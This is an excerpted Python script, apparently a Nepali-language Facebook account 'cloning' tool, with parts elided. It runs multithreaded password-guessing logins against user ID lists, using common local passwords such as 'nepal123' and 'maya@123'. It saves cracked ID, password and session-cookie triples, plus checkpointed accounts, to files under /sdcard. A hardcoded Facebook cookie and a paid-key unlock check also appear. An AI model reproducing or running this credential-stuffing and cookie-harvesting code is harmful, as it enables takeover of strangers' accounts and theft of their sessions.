...
def auto_file(cookies,access_token):
        ...
        print('\n \033[1;97m /sdcard/evil.txt \033[0;97m\n')
        #100010138361148
...
def menu():
        ...
        try:
                ...
                if "server on" in sj:
                        ...
                        linex()
                        xd=input(' Myakuri choose Gara----> ')
                        if xd in ['1','01']:
                                clear()
                                print(' Put file example:  /sdcard/file ko name.txt  etc..')
                                print(' sure xau ni haneko file xa vanera😏')
                                linex()
                                file = input(' Mathi👆 demo xa.\033[1;32m: ')
                                try:
                                        ...
                                        menu()
                                clear()
                                print(' Kun hacking ma janxau tw🧐 ')
                                linex()
                                print(' [1] hacking 1  \n [2] hacking 2 \n [3] hacking 3 ')
                                linex()
                                mthd=input(' yeouta Roja: ')
                                linex()
                                plist = []
                                print(' Crack garne process🥳 choose gara');linex();print(' [1] Lazy 😪 haru ko laagi \n [2] choice self\n [3] pradip auto pass\n [4] nobita auto pass ');linex()
                                ppp=input(' lu roji halum tw lazy haru: ')
                                if ppp in ['1','01']:
                                ...
                                with tred(max_workers=35) as crack_submit:
                                        ...
                                        print("\033[1;32m colne start vayo te sir/mam 🤤")
                                        print("\033[1;35m masta clone hana hai ")
                                        linex()
...
def za():
    ...
    if myid in str(body):
        ...
        print(" run again python evil.py")
...
def pak():
                ...
                with tred(max_workers=30) as evil:     
                        clear()
                        tl = str(len(user))
...
def bd():
                ...
                with tred(max_workers=30) as evil:
                        ...
                        print(f'\033[1;33m Use airplane mode for speed up ')
                        linex()
                        print("\033[1;33m OK IDZ SAVED IN >>>>> /SDCARD/evil-OK.TXT")
                        print("\033[1;33m CP IDZ SAVED IN >>>>> /SDCARD/evil-CP.TXT")
                        print("\033[1;33m COOKIE SAVED IN >>>> /SDCARD/evil-COOKIE.TXT")
                        linex()
                        for psx in user:
                                ids = code+psx
...
def india():
                ...
                with tred(max_workers=30) as evil:     
                        ...
                        for psx in user:
                                ...
                                passlist = [ids[4:],psx,ids,"nepal123","nepal12345","Kathmandu","nepal12","maya123","maya123","first1234","maya12345","pokhara","sagar123","nepal@123","maya@123"]
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;32m [evil] [%s] \033[1;32m[OK=%s] [%s%%]\033[1;32m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    # 'cookie': 'datr=Ox9EZk_8_W_jRDoN5iyi0TFn; sb=Ox9EZnVxPl1lFBaWw-DCOIRW; m_pixel_ratio=2.75; wd=393x750; fr=0j2w5nde4cgAwwy9f..BmRB87..AAA.0.0.BmRB9o.AWVAfwLO4iU',
    'dpr': '2.75',
    ...
    'viewport-width': '980',
                        ...
                        evil=str(session.cookies)
                        if "c_user" in evil:
                                print('\r\r\033[1;32m [evil-OK] %s | %s'%(ids,pas))
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                #print("Cookie: "+coki)
                                open('/sdcard/evil-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/evil-OK.txt', 'a').write(ids+'|'+pas+'|'+coki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in evil:
                                if 'y' in pcp:
                                        #print('\r\r\x1b[38;5;208m [evil-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/evil-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
    ...
    'viewport-width': '980',
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;33m [evil-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/evil-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;33m [evil-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/evil-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/evil-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n') 
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [evil-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/evil-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
try:
	...
	clear()
	print(logo)
	r1=requests.get("https://github.com/mugi5793").text
	if key1 in r1:
		os.system('clear')
		print(logo)
		Main()
		...
		print(" \033[1;32m Note : Evil Unlock vayo 😇  \033[1;37m")
		print ("")
		...
		os.system('am start https://wa.me/+9864200848?text=' + tks)
		Subscraption()        
Subscraption()